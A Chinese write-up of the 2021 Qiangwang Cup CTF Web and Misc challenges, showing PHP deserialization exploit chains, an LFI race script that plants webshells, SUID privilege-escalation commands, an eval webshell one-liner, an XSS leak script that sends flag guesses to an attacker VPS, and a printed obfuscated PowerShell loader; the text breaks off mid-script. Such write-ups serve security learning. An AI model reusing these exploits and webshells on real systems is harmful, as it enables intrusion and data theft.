> 原文链接: https://www.anquanke.com//post/id/244824 


# 2021 强网杯线上赛 Web&amp;Misc WriteUp


                                阅读量   
                                **92751**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01024f4cc6e0d078ff.jpg)](https://p3.ssl.qhimg.com/t01024f4cc6e0d078ff.jpg)



## 引言

> **第五届强网杯全国网络安全挑战赛 – 线上赛**
比赛时间: 2021-06-12 09:00 ~ 2021-06-13 21:00
比赛官网: [https://www.ichunqiu.com/2021qwb](https://www.ichunqiu.com/2021qwb)

这比赛时长36h，包括签到和问卷总共43题，太顶啦！

大部分都是和队里师傅们一起打的，有些题目自己看了其中一部分，赛后又稍微复现了一下。



## Web

### <a class="reference-link" name="%5B%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B%5D%E5%AF%BB%E5%AE%9D"></a>[强网先锋]寻宝

有两关

**线索1**

```
&lt;?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);
function filter($string)`{`
        $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\$','\(','\.','num','html','\/','\,','\'','0000000');
        $filter_phrase= '/'.implode('|',$filter_word).'/';
        return preg_replace($filter_phrase,'',$string);
    `}`
if($ppp)`{`
    unset($ppp);
`}`
$ppp['number1'] = "1";
$ppp['number2'] = "1";
$ppp['nunber3'] = "1";
$ppp['number4'] = '1';
$ppp['number5'] = '1';
extract($_POST);
$num1 = filter($ppp['number1']);        
$num2 = filter($ppp['number2']);        
$num3 = filter($ppp['number3']);        
$num4 = filter($ppp['number4']);
$num5 = filter($ppp['number5']);    
if(isset($num1) &amp;&amp; is_numeric($num1))`{`
    die("非数字");
`}`
else`{`

    if($num1 &gt; 1024)`{`
    echo "第一层";
        if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000)`{`
            echo "第二层";
            if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7))`{`
                echo "第三层";
                if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) )`{`
                    echo "第四层";
                    if(!isset($num5)||(strlen($num5)==0)) die("no");
                    $b=json_decode(@$num5);
                        if($y = $b === NULL)`{`
                                if($y === true)`{`
                                    echo "第五层";
                                    include 'KeY1lhv.php';
                                    echo $KEY1;
                                `}`
                        `}`else`{`
                            die("no");
                        `}`
                `}`else`{`
                    die("no");
                `}`
            `}`else`{`
                die("no");
            `}`
        `}`else`{`
            die("no");
        `}`
    `}`else`{`
        die("no111");
    `}`
`}`
```

Payload:

```
ppp[number1]=2333m&amp;ppp[number2]=1e10&amp;ppp[number3]=61823470&amp;ppp[number4]=-aabcdf&amp;ppp[number5]=null
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c9ada9cff2b13871.png)

```
KEY1`{`e1e1d3d40573127e9ee0480caf1283d6`}`
```

**线索2**

文件下载几秒会自动掐断，考虑断点续传，用 IDM 直接就能实现。

打开一堆的 docx，里面一堆垃圾 ASCII，写个脚本把所有 docx 文件读一下。

```
import os
import docx
import glob

files = glob.glob('.\\five_month\\*\\*\\*.docx')
print(files)

for file in files:
    doc = docx.Document(file)
    for i in doc.paragraphs:
        try:
            # print(i.text)
            if 'KEY2' in i.text:
                print(i.text)
                print('============================')
        except:
            pass
```

其中有个就是KEY2

`KEY2`{`T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS`}``

提交拿到 flag

### <a class="reference-link" name="%5B%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B%5D%E8%B5%8C%E5%BE%92"></a>[强网先锋]赌徒

源码：

```
&lt;meta charset="utf-8"&gt;
&lt;?php
//hint is in hint.php
error_reporting(1);


class Start
`{`
    public $name='guest';
    public $flag='syst3m("cat 127.0.0.1/etc/hint");';

    public function __construct()`{`
        echo "I think you need /etc/hint . Before this you need to see the source code";
    `}`

    public function _sayhello()`{`
        echo $this-&gt;name;
        return 'ok';
    `}`

    public function __wakeup()`{`
        echo "hi";
        $this-&gt;_sayhello();
    `}`
    public function __get($cc)`{`
        echo "give you flag : ".$this-&gt;flag;
        return ;
    `}`
`}`

class Info
`{`
    private $phonenumber=123123;
    public $promise='I do';

    public function __construct()`{`
        $this-&gt;promise='I will not !!!!';
        return $this-&gt;promise;
    `}`

    public function __toString()`{`
        return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee'];
    `}`
`}`

class Room
`{`
    public $filename='/flag';
    public $sth_to_set;
    public $a='';

    public function __get($name)`{`
        $function = $this-&gt;a;
        return $function();
    `}`

    public function Get_hint($file)`{`
        $hint=base64_encode(file_get_contents($file));
        echo $hint;
        return ;
    `}`

    public function __invoke()`{`
        $content = $this-&gt;Get_hint($this-&gt;filename);
        echo $content;
    `}`
`}`

if(isset($_GET['hello']))`{`
    unserialize($_GET['hello']);
`}`else`{`
    $hi = new  Start();
`}`

?&gt;
```

`Room` 里可以读取文件并输出，但是需要以调用函数的方式调用这个对象。正好里面的 `__get()` 方法当调用对象中不存在的属性或者私有的属性的时候就能触发调用他自己。

再看 `Info` 对象里的 `__toString` 就可以调用一个 `Room` 里不存在的对象 `ffiillee['ffiilleennaammee']`。

为了实现输出 `Info`，看到 `Start` 里反序列化的时候会调用 `_sayhello()` 方法。

于是让 `Start-&gt;name` 指向 `Info`，`Info-&gt;file['filename']` 指向 `Room`，然后以调用函数的方式调用 `Room`，`Room-&gt;filename = '/flag'` 就能输出 flag 了。

（这里说的对象还要实例化一下

Exp：

```
&lt;?php
error_reporting(1);

class Start
`{`
    public $name;
`}`

class Info
`{`
    private $phonenumber = 123123;
    public $promise = 'I do';
`}`

class Room
`{`
    public $filename = '/flag';
    public $sth_to_set;
    public $a = '';
`}`

$c = new Room();
$d = new Room();
$d-&gt;filename = '/flag';

$a = new Start();

$b = new Info();
$b-&gt;file['filename'] = $c;

$a-&gt;name = $b;
$c-&gt;a = $d;

echo urlencode(serialize($a));
?&gt;
```

### <a class="reference-link" name="WhereIsUWebShell"></a>WhereIsUWebShell

源码

```
&lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--&gt;
&lt;?php
// index.php
ini_set('display_errors', 'on');
if(!isset($_COOKIE['ctfer']))`{`
    setcookie("ctfer",serialize("ctfer"),time()+3600);
`}`else`{`
    include "function.php";
    echo "I see your Cookie&lt;br&gt;";
    $res = unserialize($_COOKIE['ctfer']);
    if(preg_match('/myclass/i',serialize($res)))`{`

        throw new Exception("Error: Class 'myclass' not found ");
    `}`
`}`
highlight_file(__FILE__);
echo "&lt;br&gt;";
highlight_file("myclass.php");
echo "&lt;br&gt;";
highlight_file("function.php");
&lt;?php
// myclass.php
class Hello`{`
    public function __destruct()
    `{`   if($this-&gt;qwb) echo file_get_contents($this-&gt;qwb);
    `}`
`}`
?&gt;
&lt;?php
// function.php
function __autoload($classname)`{`
    require_once "/var/www/html/$classname.php";
`}`
?&gt;
```

入口的 COOKIE 存在反序列化

去掉最后的大括号，利用反序列化报错来防止进入 Exception

```
O:7:"myclass":1:`{`s:1:"h";O:5:"Hello":1:`{`s:3:"qwb";s:36:"e2a7106f1cc8bb1e1318df70aa0a3540.php";`}`
O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012ab4b15c18665286.png)

`e2a7106f1cc8bb1e1318df70aa0a3540.php`

```
&lt;?php
include "bff139fa05ac583f685a523ab3d110a0.php";
include "45b963397aa40d4a0063e0d85e4fe7a1.php";
$file = isset($_GET['72aa377b-3fc0-4599-8194-3afe2fc9054b'])?$_GET['72aa377b-3fc0-4599-8194-3afe2fc9054b']:"404.html";
$flag = preg_match("/tmp/i",$file);
if($flag)`{`
    PNG($file);
`}`
include($file);
$res = @scandir($_GET['dd9bd165-7cb2-446b-bece-4d54087185e1']);
if(isset($_GET['dd9bd165-7cb2-446b-bece-4d54087185e1'])&amp;&amp;$_GET['dd9bd165-7cb2-446b-bece-4d54087185e1']==='/tmp')`{`
    $somthing = GenFiles();
    $res = array_merge($res,$somthing);
`}`
shuffle($res);
@print_r($res);
?&gt;
```

`bff139fa05ac583f685a523ab3d110a0.php`

```
&lt;?php
function PNG($file)
`{`
    if(!is_file($file))`{`die("我从来没有见过侬");`}`
    $first = imagecreatefrompng($file);
    if(!$first)`{`
        die("发现了奇怪的东西2333");
    `}`
    $size = min(imagesx($first), imagesy($first));
    unlink($file);
    $second = imagecrop($first, ['x' =&gt; 0, 'y' =&gt; 0, 'width' =&gt; $size, 'height' =&gt; $size]);
    if ($second !== FALSE) `{`
        imagepng($second, $file);
        imagedestroy($second);//销毁，清内存
    `}`
    imagedestroy($first);
`}`
?&gt;
```

`45b963397aa40d4a0063e0d85e4fe7a1.php`

```
&lt;?php

function GenFiles()`{`
    $files = array();
    $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $len=strlen($str)-1;
    for($i=0;$i&lt;10;$i++)`{`
        $filename="php";
        for($j=0;$j&lt;6;$j++)`{`
            $filename  .= $str[rand(0,$len)];
        `}`
        // file_put_contents('/tmp/'.$filename,'flag`{`fake_flag`}`');
        $files[] = $filename;
    `}`
    return $files;
`}`

?&gt;
```

/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=passwd&amp;dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp

当前应该是在 /etc 目录下（？

不过没啥用，不能直接读 /flag，或者说 flag 不在根目录

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c8c415f696908267.png)

参考 [LFI via SegmentFault](https://www.jianshu.com/p/dfd049924258)

> <pre><code class="hljs ruby">include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
</code></pre>
可以导致 php 在执行过程中 Segment Fault
<p>本地文件包含漏洞可以让 php 包含自身从而导致死循环<br>
然后 php 就会崩溃 , 如果请求中同时存在一个上传文件的请求的话 , 这个文件就会被保留</p>

魔改他的脚本

```
# -*- coding: utf-8 -*-

import requests
import string
import itertools

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

base_url = "http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com"


def upload_file_to_include(url, file_content):
    files = `{`'file': ('evil.jpg', file_content, 'image/jpeg')`}`
    try:
        response = requests.post(url, files=files)
        print(response)
    except Exception as e:
        print(e)


def generate_tmp_files():
    with open('miao.png', 'rb') as fin:
        file_content = fin.read()
    phpinfo_url = "%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd" % (
        base_url)
    length = 6
    times = int(len(charset) ** (length / 2))
    for i in range(times):
        print("[+] %d / %d" % (i, times))
        upload_file_to_include(phpinfo_url, file_content)


def main():
    generate_tmp_files()


if __name__ == "__main__":
    main()
```

图片是个长宽相等的 png，里面放木马。

上传过程中就会留下一些文件不会被删除。

一边跑这个脚本，另一边的一堆 /tmp/phpxxxxxx 里就存在我们的 webshell

由于会自动删除，没了就换新的

根目录果然没 flag

[![](https://p5.ssl.qhimg.com/t01224c83da1ecb2b25.png)](https://p5.ssl.qhimg.com/t01224c83da1ecb2b25.png)

然后利用 shell 发现 `/usr/bin` 下面有个文件可以以 root 权限执行命令

```
find / -user root -perm -4000 -print 2&gt;/dev/null
# 或者
# find / -perm -u=s -type f 2&gt;/dev/null
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e97ef384b763ab22.png)

flag 在 /l1b 下一个绕来绕去的目录里面

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015bbd2c284aa26dd6.png)

或者

```
find / -perm 600 -user root
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019799da62a17f59f5.png)

最后执行

```
/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/82a71a2d/e17e0f28/74cb5ced/8f93ff64/3396136a/Fl444ggg160b5c41
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0106e9dc3136fb3d62.png)

```
POST /e2a7106f1cc8bb1e1318df70aa0a3540.php?b822f88a-de15-4dc8-923b-1cbeec54bcfc=/tmp/phpi8bEt1&amp;0=system HTTP/1.1
Host: eci-2zehg7ugvk0ahcsnkehl.cloudeci1.ichunqiu.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=1769d95cb5b54d-04781d3935eefa-c791039-1fa400-1769d95cb5c669; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1611909425; ctfer=s%3A5%3A%22ctfer%22%3B; __jsluid_h=847d751b863f86e3ed743f9efb5d5c4f
Connection: close
Content-Length: 110
Content-Type: application/x-www-form-urlencoded

1=/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/82a71a2d/e17e0f28/74cb5ced/8f93ff64/3396136a/Fl444ggg160b5c41

```

`flag`{`b101e657-a46a-4791-abcb-5be544fc12bd`}``

### <a class="reference-link" name="EasyWeb"></a>EasyWeb

> 题目来源于某次帮朋友测试项目的渗透过程，非常非常简单，没有新的知识点，已经去掉了很多需要脑洞猜测的部分，不过依然需要进行一些信息收集工作。So~ Be Patient~And have funny!
<p>​ 47.104.136.46<br>
​ 47.104.137.239<br>
​ 121.42.242.238</p>
（每 20 分钟重启一次环境）
<ol>
- flag不在数据库；1. 能看到报错信息是预期现象
</ol>

直接访问，根据 html 里的提示访问 `/hint`，得知文件在 `/files/????????????????????????????????`

[![](https://p1.ssl.qhimg.com/t01bb63ccc8dfd3ed22.png)](https://p1.ssl.qhimg.com/t01bb63ccc8dfd3ed22.png)

访问 `/file` 下载得到相应的文件

[![](https://p5.ssl.qhimg.com/t014af5af259980cc60.png)](https://p5.ssl.qhimg.com/t014af5af259980cc60.png)

根据里面的 `hint.txt`，扫描端口得到

[http://121.42.242.238:36842](http://121.42.242.238:36842)

```
Try to scan 35000-40000 ^_^.
All tables are empty except for the table where the username and password are located
Table: employee
```

[![](https://p0.ssl.qhimg.com/t0122da610294e45efd.png)](https://p0.ssl.qhimg.com/t0122da610294e45efd.png)

sql 注入得到登录信息为 `admin`、`99f609527226e076d668668582ac4420`

扫目录得到 /file 有文件上传

[![](https://p3.ssl.qhimg.com/t019bfab0904c7ae76c.png)](https://p3.ssl.qhimg.com/t019bfab0904c7ae76c.png)

直接上传会被卡

改文件名为 `php.php` 可以绕过

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012bd9a53ace75251a.png)

然后文件内容绕过，先用段标签和 `$_GET[1]` 绕过写小马，再通过 `?1=echo '&lt;?php [@eval](https://github.com/eval)($_POST[m]);?&gt;' &gt; x.php` 写马。

蚁剑连上之后发现权限不够，读不了 flag。

查看端口发现有个端口还跑着 jboss。

代理整出来，然后参考 [jboss漏洞getshell](https://blog.csdn.net/weixin_43999372/article/details/88364032) 写 webshell，最后读到 flag。

**（比赛结束之后环境关了也就么得图了**

`flag`{`V3ry_v3rY_E3si_a_w3B_Ch[@1l3ng3](https://github.com/1l3ng3)`}``

### <a class="reference-link" name="EasyXSS"></a>EasyXSS

> The BOT starts every five seconds and handles only one reported URL at a time. The BOT is Google-Chrome 91.0.4472.77 (Official Build) (64-bit)
Notice: the address requested by the BOT is [http://localhost:8888](http://localhost:8888).
Each time the BOT processes a request, it clears subsequent report URLs from the database
每 15 分钟重启环境
<p>47.104.192.54:8888<br>
47.104.210.56:8888<br>
47.104.155.242:8888</p>
Hint: flag格式是flag`{`uuid`}`

算是个 [XS-Leaks](https://xsleaks.com/) 的题目，算是侧信道的一种吧。

通过 `/hint` 路由可以知道 flag 判断逻辑。

```
app.all("/flag", auth, async (req, res, next) =&gt; `{`
    if (req.session.isadmin &amp;&amp; typeof req.query.var === "string") `{`
        fs.readFile("/flag", "utf8", (err, flag) =&gt; `{`
            let flagArray = flag.split("");
            let dataArray = req.query.var.split("");
            let check = true;
            for (let i = 0; i &lt; dataArray.length &amp;&amp; i &lt; flagArray.length; i++) `{`
                if (dataArray[i] !== flagArray[i]) `{`
                    check = false;
                    break;
                `}`
            `}`
            if (check) `{`
                res.status(200).send(req.query.var);
            `}` else `{`
                res.status(500).send("Keyword Error!");
            `}`
        `}`);
    `}` else `{`
        res.status(500).send("Sorry, you are not admin!");
    `}`
`}`);
```

`/flag` 路由对输入的逐个字符与 flag 的这么多个（输入的）长度的字符进行比较，如果每一位都相同则返回 200，否则返回 500.

访问 `/about?theme=xxxxx` 发现存在 XSS。不过过滤了一些东西，比如 空格可以用 `%09` 绕过之类。

根据提示 flag 是个 UUID，于是可以按照这个格式逐位爆破，通过返回的状态来判断当前字符是否正确。

访问 `/about?theme=xxxxx` 发现存在 XSS。不过过滤了一些东西，比如 空格可以用 `%09` 绕过之类。

于是就在 VPS 上跑个脚本，分成功和失败两个路由，让 bot 访问自己的 `/flag` 路由。

如果成功返回则调用 Ajax 去请求 VPS 上的 success 路由，否则请求 error 路由，并通过参数返回当前爆破的 flag。

exp：

```
from flask import Flask
from flask import request
import requests
import urllib.parse

app = Flask(__name__)

@app.route("/success")
def index():
    global cookies
    global url
    data = request.args.get('a')
    if len(data) == 13 or len(data) == 18 or len(data) == 23 or len(data) == 28:
        data += "-0"
    else:
        data += "0"
    p = '''";t="''' + data +'''",$.ajax(`{`url:"/flag?var="+t`}`).done(function(o)`{`window.location="http://自己的VPS/success?a="+t`}`).fail(function()`{`window.location="http://自己的VPS/error?a="+t`}`);//'''
    p = "http://localhost:8888/about?theme=" + urllib.parse.quote(p)
    d = `{`
        "url": p
    `}`
    requests.post(url, data=d, cookies=cookies)
    return "Hello World!"

@app.route("/error")
def index2():
    global cookies
    global url
    data = request.args.get('a')
    tmp = data[:-1]
    if data[-1] == "9":
        tmp += "a"
    else:
        tmp += chr(ord(data[-1]) + 1)
    data = tmp
    p = '''";t="''' + data +'''",$.ajax(`{`url:"/flag?var="+t`}`).done(function(o)`{`window.location="http://自己的VPS/success?a="+t`}`).fail(function()`{`window.location="http://自己的VPS/error?a="+t`}`);//'''
    p = "http://localhost:8888/about?theme=" + urllib.parse.quote(p)
    d = `{`
        "url": p
    `}`
    requests.post(url, data=d, cookies=cookies)
    return "Hello World!"

cookies = `{`"session":"s%3ASuDwPHFP03I6VDRGiad8Zzst0owLeQY_.MjxB%2BTBwTgesKkEE9dIR95EoJPMuNNh%2BOZFw6ajDMm0"`}`
# url = "http://47.104.210.56:8888/report"
url = "http://47.104.192.54:8888/report"
app.run(host='0.0.0.0', port=80)
```

让 bot 从 `0` 开始访问，虽然容器固定时间重启，但是 flag 是静态的 uuid，所以就是时间问题了。

最后根据 VPS 上的访问记录就能得到 flag 了。

## Misc

### <a class="reference-link" name="BlueTeaming"></a>BlueTeaming

> Powershell scripts were executed by malicious programs. What is the registry key that contained the power shellscript content?（本题flag为非正式形式）
[附件下载](https://pan.baidu.com/s/1itThwJT5kCw-RG3YnandOQ) 提取码（GAME）[备用下载](https://share.weiyun.com/qWoVMafc)
压缩包解压密码：fantasicqwb2021

首先使用 volatility 将内存中的 register hive 导出来.

```
volatility -f memory.dmp --profile Win7SP1x64 hivelist
volatility -f memory.dmp --profile Win7SP1x64 dumpregistry -D .
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cc58d25ab6df8b3a.png)

题目中说到可能和 powershell 恶意程序有关系，那么优先考虑 SOFTWARE 专用的字符串，使用 WRR.exe 工具检查注册表，然后全局搜索一些常见的恶意软件字段，比如 -IEX, encode decompress new-object 等等，最终能够找到恶意软件存放的注册表位置

搜到一个路径是`CMI-CreateHive`{`199DAFC2-6F16-4946-BF90-5A3FC3A60902`}`\Microsoft\Windows\Communication`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01495495eeae7d0dfd.png)

恶意脚本是

```
&amp; ( $veRBOsepReFErEncE.tOstrINg()[1,3]+'x'-JOin'')( nEW-ObjEcT sySTEm.iO.sTreaMReAdER( ( nEW-ObjEcT  SystEm.iO.CompreSsiOn.DEfLATEstREam([IO.meMoryStream] [CoNVeRT]::fROMbASe64StRinG('NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=' ) , [IO.coMPressION.cOMPresSiOnmOde]::dEcOMPresS)), [TexT.ENcODInG]::AsCIi)).ReaDToeNd()
```

flag是 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication`

### <a class="reference-link" name="CipherMan"></a>CipherMan

> The attacker maliciously accessed the user’s PC and encrypted specific volumes. How to decrypt the volume?（本题flag为非正式形式）
[附件下载](https://pan.baidu.com/s/1G2zgTROW7-h7nZ0Cfct-4g) 提取码（GAME）[备用下载](https://share.weiyun.com/SQfdghDG)
压缩包解压密码：fantasicqwb2021

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f5458fdd9611e9c0.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01be6d54ce7b74d671.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013f11c672a6bcf1f9.png)

```
BitLocker 드라이브 암호화 복구 키
 복구 키는 BitLocker로 보호되는 드라이브에서 데이터를 검색하기 위해 사용됩니다.
이 키가 올바른 복구 키인지 확인하려면 복구 화면에 표시된 것과 ID를 비교하십시오.
복구 키 ID: 168F1291-82C1-4B
전체 복구 키 ID: 168F1291-82C1-4BF2-B634-9CCCEC63E9ED
BitLocker 복구 키:
221628-533357-667392-449185-516428-718443-190674-375100


BitLocker驱动器加密恢复键
恢复密钥用于在被保护为BitLocker的驱动器中搜索数据。
如果您想确认此密钥是否正确，请比较恢复屏幕上显示的和ID。
恢复密钥ID:168F1291-82C1-4B
整体恢复密钥ID:168F1291-82C1-4BF2-B634-9CCCEC63E9ED
BitLocker恢复键：
221628-533357-667392-449185-516428-718443-190674-375100
```

DiskGenius 解密

[![](https://p5.ssl.qhimg.com/t01bba3e396dcb3086c.png)](https://p5.ssl.qhimg.com/t01bba3e396dcb3086c.png)

```
Wow，you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.
```

找了半天最后发现这个内容就是 flag。。

> 赛后发现是原题
[Digital Forensic Challenge 2018 VOI200 문제 풀이](https://whitesnake1004.tistory.com/675)

### <a class="reference-link" name="ExtremelySlow"></a>ExtremelySlow

> [附件下载](https://pan.baidu.com/s/19pn6uALdsyInuUMXPEMmuQ) 提取码（GAME）[备用下载](https://share.weiyun.com/NcvTkpC3)
压缩包解压密码：fantasicqwb2021

首先是一个流量包，里面全是 TCP 和 HTTP 流量。而且是 206 分段传输，每个包传 1byte。

于是先导出为 JSON，然后写个脚本提取其中的每个 byte，最后合并得到一个二进制文件。

wireshark 直接导出的 JSON 里 `http.response.line` 包含多个，如果直接用 `json.loads` 只保留最后一个了，所以先要去掉无关的内容。

```
import json
import re

with open('http.json', 'r', encoding='utf-8') as fin:
    s = fin.read()

re_num = re.compile(
    r'\"http\.response\.line\": \"content-range: bytes (\d+)-\d+/1987\\r\\n\"')
re_nonnum = re.compile(
    r'(\"http\.response\.line\": (?!\"content-range: bytes (\d+)-\d+/1987\\r\\n\",).*)')
s1 = re.sub(re_nonnum, '', s)

with open('http_sub.json', 'w', encoding='utf-8') as fout:
    fout.write(s1)

http = json.loads(s1)
total = [b''] * 1987
# total = [''] * 1987
idx_list = []
for x in http:
    source = x['_source']
    layers = source['layers']
    # get data
    data = layers['data']['data.data']
    data = bytes([int(data, 16)])
    # find index
    n = layers['http']['http.response.line']
